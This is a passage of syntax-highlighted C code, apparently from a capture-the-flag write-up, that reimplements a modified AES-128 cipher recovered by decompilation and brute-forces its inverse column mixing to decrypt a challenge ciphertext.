class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line"><span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> INV_SBOX[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x38</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>, <span class="number">0xA3</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0xD7</span>, <span class="number">0xFB</span>,</span><br><span class="line"><span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xDE</span>, <span class="number">0xE9</span>, <span class="number">0xCB</span>,</span><br><span class="line"><span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x3D</span>, <span class="number">0xEE</span>, <span class="number">0x4C</span>, <span class="number">0x95</span>, <span class="number">0x0B</span>, <span class="number">0x42</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x4E</span>,</span><br><span class="line"><span class="number">0x08</span>, <span class="number">0x2E</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xD9</span>, <span class="number">0x24</span>, <span class="number">0xB2</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0xA2</span>, <span class="number">0x49</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0xD1</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xF6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xD4</span>, <span class="number">0xA4</span>, <span class="number">0x5C</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>,</span><br><span class="line"><span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xFD</span>, <span class="number">0xED</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0x5E</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x0A</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xB3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line"><span class="number">0xD0</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0xAF</span>, <span class="number">0xBD</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x6B</span>,</span><br><span class="line"><span class="number">0x3A</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0x97</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xAD</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x37</span>, <span class="number">0xE8</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x6E</span>,</span><br><span class="line"><span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0xB7</span>, <span class="number">0x62</span>, <span class="number">0x0E</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0xBE</span>, <span class="number">0x1B</span>,</span><br><span class="line"><span class="number">0xFC</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x4B</span>, <span class="number">0xC6</span>, <span class="number">0xD2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0xC0</span>, <span class="number">0xFE</span>, <span class="number">0x78</span>, <span class="number">0xCD</span>, <span class="number">0x5A</span>, <span class="number">0xF4</span>,</span><br><span class="line"><span class="number">0x1F</span>, <span class="number">0xDD</span>, <span class="number">0xA8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x31</span>, <span class="number">0xB1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7F</span>, <span class="number">0xA9</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x2D</span>, <span class="number">0xE5</span>, <span class="number">0x7A</span>, <span class="number">0x9F</span>, <span class="number">0x93</span>, <span class="number">0xC9</span>, <span class="number">0x9C</span>, <span class="number">0xEF</span>,</span><br><span class="line"><span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>, <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xBB</span>, <span class="number">0x3C</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x7E</span>, <span class="number">0xBA</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x7D</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">shift_rows</span><span class="params">(<span class="type">uint8_t</span>* state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> temp; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempa; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempb; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempc; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">temp = state[<span class="number">12</span>];</span><br><span class="line">state[<span class="number">12</span>] = state[<span class="number">8</span>];</span><br><span class="line">state[<span class="number">8</span>] = state[<span class="number">4</span>];</span><br><span class="line">state[<span class="number">4</span>] = *state;</span><br><span class="line">*state = temp;</span><br><span class="line">tempa = state[<span class="number">1</span>];</span><br><span class="line">state[<span class="number">1</span>] = state[<span class="number">9</span>];</span><br><span class="line">state[<span class="number">9</span>] = tempa;</span><br><span class="line">tempb = state[<span class="number">5</span>];</span><br><span class="line">state[<span class="number">5</span>] = state[<span class="number">13</span>];</span><br><span class="line">state[<span class="number">13</span>] = tempb;</span><br><span class="line">tempc = state[<span class="number">2</span>];</span><br><span class="line">state[<span class="number">2</span>] = state[<span class="number">6</span>];</span><br><span class="line">state[<span class="number">6</span>] = state[<span class="number">10</span>];</span><br><span class="line">state[<span class="number">10</span>] = state[<span class="number">14</span>];</span><br><span class="line">state[<span class="number">14</span>] = tempc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">inv_shiftrows</span><span class="params">( <span class="type">uint8_t</span>* state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> temp; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempa; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempb; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempc; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//temp = state[12];</span></span><br><span class="line"><span class="comment">//state[12] = state[8];</span></span><br><span class="line"><span class="comment">//state[8] = state[4];</span></span><br><span class="line"><span class="comment">//state[4] = *state;</span></span><br><span class="line"><span class="comment">//*state = temp;</span></span><br><span class="line"></span><br><span class="line">temp = *state;</span><br><span class="line">*state = state[<span class="number">4</span>];</span><br><span class="line">state[<span class="number">4</span>] = state[<span class="number">8</span>];</span><br><span class="line">state[<span class="number">8</span>] = state[<span class="number">12</span>];</span><br><span class="line">state[<span class="number">12</span>] = temp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//tempa = state[1];</span></span><br><span class="line"><span class="comment">//state[1] = state[9];</span></span><br><span class="line"><span class="comment">//state[9] = tempa;</span></span><br><span class="line"></span><br><span class="line">tempa = state[<span class="number">9</span>];</span><br><span class="line">state[<span class="number">9</span>] = state[<span class="number">1</span>];</span><br><span class="line">state[<span class="number">1</span>] = tempa;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//tempb = state[5];</span></span><br><span class="line"><span class="comment">//state[5] = state[13];</span></span><br><span class="line"><span class="comment">//state[13] = tempb;</span></span><br><span class="line"></span><br><span class="line">tempb = state[<span class="number">13</span>];</span><br><span class="line">state[<span class="number">13</span>] = state[<span class="number">5</span>];</span><br><span class="line">state[<span class="number">5</span>] = tempb;</span><br><span class="line"></span><br><span class="line"><span class="comment">//tempc = state[2];</span></span><br><span class="line"><span class="comment">//state[2] = state[6];</span></span><br><span class="line"><span class="comment">//state[6] = state[10];</span></span><br><span class="line"><span class="comment">//state[10] = state[14];</span></span><br><span class="line"><span class="comment">//state[14] = tempc;</span></span><br><span class="line"></span><br><span class="line">tempc = state[<span class="number">14</span>];</span><br><span class="line">state[<span class="number">14</span>] = state[<span class="number">10</span>];</span><br><span class="line">state[<span class="number">10</span>] = state[<span class="number">6</span>];</span><br><span class="line">state[<span class="number">6</span>] = state[<span class="number">2</span>];</span><br><span class="line">state[<span class="number">2</span>] = tempc;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint8_t</span> __cdecl <span class="title">mul2</span><span class="params">(<span class="type">uint8_t</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((a &amp; <span class="number">0x80</span>u) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * a;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">return</span> (<span class="number">2</span> * a) ^ <span class="number">0x1B</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">aes_encrypt_128</span><span class="params">(BYTE* roundkeys, BYTE* m, BYTE* c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span>* mid; <span class="comment">// rax</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span>* v4; <span class="comment">// rax</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span>* v5; <span class="comment">// rax</span></span><br><span class="line"><span class="type">uint8_t</span> tmp[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"><span class="type">uint8_t</span> t; <span class="comment">// [rsp+3Dh] [rbp-3h]</span></span><br><span class="line"><span class="type">uint8_t</span> j; <span class="comment">// [rsp+3Eh] [rbp-2h]</span></span><br><span class="line"><span class="type">uint8_t</span> i; <span class="comment">// [rsp+3Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">&#123;</span><br><span class="line">mid = roundkeys++;</span><br><span class="line">c[i] = *mid ^ m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= <span class="number">9u</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">tmp[i] = INV_SBOX[c[i]];</span><br><span class="line"><span class="built_in">shift_rows</span>(tmp);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">t = tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">1</span>] ^ tmp[i] ^ tmp[i + <span class="number">3</span>];</span><br><span class="line">c[i] = t ^ tmp[i] ^ <span class="built_in">mul2</span>(tmp[i] ^ tmp[i + <span class="number">1</span>]);</span><br><span class="line">c[i + <span class="number">1</span>] = t ^ tmp[i + <span class="number">1</span>] ^ <span class="built_in">mul2</span>(tmp[i + <span class="number">1</span>] ^ tmp[i + <span class="number">2</span>]);</span><br><span class="line">c[i + <span class="number">2</span>] = t ^ tmp[i + <span class="number">2</span>] ^ <span class="built_in">mul2</span>(tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">3</span>]);</span><br><span class="line">c[i + <span class="number">3</span>] = t ^ tmp[i + <span class="number">3</span>] ^ <span class="built_in">mul2</span>(tmp[i + <span class="number">3</span>] ^ tmp[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v4 = roundkeys++;</span><br><span class="line">c[i] ^= *v4;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">c[i] = INV_SBOX[c[i]];</span><br><span class="line"><span class="built_in">shift_rows</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v5 = roundkeys++;</span><br><span class="line">c[i] ^= *v5;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cToTmp</span><span class="params">(<span class="type">uint8_t</span>* tmp, <span class="type">uint8_t</span>* c)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint8_t</span> t = c[i + <span class="number">2</span>] ^ c[i + <span class="number">1</span>] ^ c[i] ^ c[i + <span class="number">3</span>];</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t0 = <span class="number">0</span>; t0 &lt;= <span class="number">256</span>; t0++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t1 = <span class="number">0</span>; t1 &lt;= <span class="number">256</span>; t1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i] == (t ^ t0 ^ <span class="built_in">mul2</span>(t0 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t2 = <span class="number">0</span>; t2 &lt;= <span class="number">256</span>; t2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">1</span>] == (t ^ t1 ^ <span class="built_in">mul2</span>(t2 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t3 = <span class="number">0</span>; t3 &lt;= <span class="number">256</span>; t3++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">2</span>] == (t ^ t2 ^ <span class="built_in">mul2</span>(t2 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">3</span>] == (t ^ t3 ^ <span class="built_in">mul2</span>(t0 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line">tmp[i] = t0;</span><br><span class="line">tmp[i + <span class="number">1</span>] = t1;</span><br><span class="line">tmp[i + <span class="number">2</span>] = t2;</span><br><span class="line">tmp[i + <span class="number">3</span>] = t3;</span><br><span class="line"><span class="comment">//printf(&quot;%x %x %x %x\n&quot;, tmp[i], tmp[i + 1], tmp[i + 2], tmp[i + 3]);</span></span><br><span class="line"><span class="keyword">goto</span> next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">next:;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_decrypt_128</span><span class="params">(BYTE* roundkeys, BYTE* c, BYTE* m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> tmp[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">BYTE* u = <span class="number">0</span>;</span><br><span class="line">roundkeys = &amp;roundkeys[<span class="number">175</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xf</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">u = roundkeys--;</span><br><span class="line">m[i] = *u ^ c[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">9</span>; j &gt;= <span class="number">1</span>; --j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">inv_shiftrows</span>(m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>; ++i)</span><br><span class="line">m[i] = SBOX[m[i]];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xf</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">u = roundkeys--;</span><br><span class="line">m[i] ^= *u;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cToTmp</span>(tmp, m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">m[i] = tmp[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">inv_shiftrows</span>(m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>; ++i)</span><br><span class="line">m[i] = SBOX[m[i]];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xf</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">u = roundkeys--;</span><br><span class="line">m[i] ^= *u;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">encMain</span><span class="params">(BYTE* roundKey, BYTE* m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//auto part1 = reinterpret_cast&lt;BYTE*&gt;(const_cast&lt;char*&gt;(m.substr(0, m.length() / 2).c_str()));</span></span><br><span class="line"><span class="comment">//auto part2 = reinterpret_cast&lt;BYTE*&gt;(const_cast&lt;char*&gt;(m.substr(m.length() / 2).c_str()));</span></span><br><span class="line"><span class="comment">/*BYTE* part1 = const_cast&lt;BYTE*&gt;(m.data());*/</span></span><br><span class="line"></span><br><span class="line">BYTE c[<span class="number">33</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">aes_encrypt_128</span>(roundKey, m, c);</span><br><span class="line"><span class="built_in">aes_encrypt_128</span>(roundKey, m + <span class="number">16</span>, &amp;c[<span class="number">16</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, c[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decMain</span><span class="params">(BYTE* roundKey, BYTE* c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE m[<span class="number">33</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">aes_decrypt_128</span>(roundKey, c, m);</span><br><span class="line"><span class="built_in">aes_decrypt_128</span>(roundKey, &amp;c[<span class="number">16</span>], m + <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, m[i]);</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, m);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE m[] = <span class="string">&quot;11111111111111111111111111111111\0&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> rkey[<span class="number">179</span>] = &#123;</span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x21</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x98</span>, <span class="number">0x91</span>, <span class="number">0xF1</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0xAE</span>, <span class="number">0x7E</span>, <span class="number">0x9A</span>, <span class="number">0xAB</span>, <span class="number">0xCD</span>, <span class="number">0x0A</span>, <span class="number">0xFC</span>, <span class="number">0x8A</span>, <span class="number">0xEC</span>,</span><br><span class="line"><span class="number">0xD7</span>, <span class="number">0xE6</span>, <span class="number">0x5F</span>, <span class="number">0x96</span>, <span class="number">0xDD</span>, <span class="number">0x13</span>, <span class="number">0xAB</span>, <span class="number">0x38</span>, <span class="number">0xA3</span>, <span class="number">0x89</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xA9</span>, <span class="number">0x75</span>, <span class="number">0x8A</span>, <span class="number">0x19</span>,</span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x98</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x93</span>, <span class="number">0x8B</span>, <span class="number">0x20</span>, <span class="number">0x7D</span>, <span class="number">0x30</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0x77</span>, <span class="number">0xAA</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0xB3</span>, <span class="number">0x34</span>, <span class="number">0x0A</span>, <span class="number">0xAB</span>, <span class="number">0x20</span>, <span class="number">0xBF</span>, <span class="number">0x2A</span>, <span class="number">0xD6</span>, <span class="number">0x10</span>, <span class="number">0xBD</span>, <span class="number">0x0A</span>, <span class="number">0x5E</span>, <span class="number">0x89</span>, <span class="number">0xCA</span>, <span class="number">0xA0</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0xD7</span>, <span class="number">0xD4</span>, <span class="number">0x80</span>, <span class="number">0x0C</span>, <span class="number">0xF7</span>, <span class="number">0x6B</span>, <span class="number">0xAA</span>, <span class="number">0xDA</span>, <span class="number">0xE7</span>, <span class="number">0xD6</span>, <span class="number">0xA0</span>, <span class="number">0x84</span>, <span class="number">0x6E</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0x4B</span>,</span><br><span class="line"><span class="number">0x6B</span>, <span class="number">0xB7</span>, <span class="number">0x33</span>, <span class="number">0x93</span>, <span class="number">0x9C</span>, <span class="number">0xDC</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0x7B</span>, <span class="number">0x0A</span>, <span class="number">0x39</span>, <span class="number">0xCD</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x39</span>, <span class="number">0x86</span>,</span><br><span class="line"><span class="number">0x6C</span>, <span class="number">0xA5</span>, <span class="number">0x77</span>, <span class="number">0xCA</span>, <span class="number">0xF0</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x83</span>, <span class="number">0x8B</span>, <span class="number">0x73</span>, <span class="number">0xD7</span>, <span class="number">0x4E</span>, <span class="number">0x9E</span>, <span class="number">0x65</span>, <span class="number">0xEE</span>, <span class="number">0xC8</span>,</span><br><span class="line"><span class="number">0xA1</span>, <span class="number">0x8D</span>, <span class="number">0x9F</span>, <span class="number">0xC1</span>, <span class="number">0x51</span>, <span class="number">0xF4</span>, <span class="number">0x71</span>, <span class="number">0x42</span>, <span class="number">0xDA</span>, <span class="number">0x87</span>, <span class="number">0xA6</span>, <span class="number">0x0C</span>, <span class="number">0x44</span>, <span class="number">0xE2</span>, <span class="number">0x48</span>, <span class="number">0xC4</span>,</span><br><span class="line"><span class="number">0x22</span>, <span class="number">0xDF</span>, <span class="number">0x83</span>, <span class="number">0xDA</span>, <span class="number">0x73</span>, <span class="number">0x2B</span>, <span class="number">0xF2</span>, <span class="number">0x98</span>, <span class="number">0xA9</span>, <span class="number">0xAC</span>, <span class="number">0x54</span>, <span class="number">0x94</span>, <span class="number">0xED</span>, <span class="number">0x4E</span>, <span class="number">0x1C</span>, <span class="number">0x50</span>,</span><br><span class="line"><span class="number">0x3B</span>, <span class="number">0x43</span>, <span class="number">0xD0</span>, <span class="number">0x8F</span>, <span class="number">0x48</span>, <span class="number">0x68</span>, <span class="number">0x22</span>, <span class="number">0x17</span>, <span class="number">0xE1</span>, <span class="number">0xC4</span>, <span class="number">0x76</span>, <span class="number">0x83</span>, <span class="number">0x0C</span>, <span class="number">0x8A</span>, <span class="number">0x6A</span>, <span class="number">0xD3</span>,</span><br><span class="line"><span class="number">0x40</span>, <span class="number">0x15</span>, <span class="number">0x40</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//encMain(rkey, m);</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> c[<span class="number">8</span>] = &#123;</span><br><span class="line"><span class="number">0x768E076C</span>, <span class="number">0x8A2F31A6</span>, <span 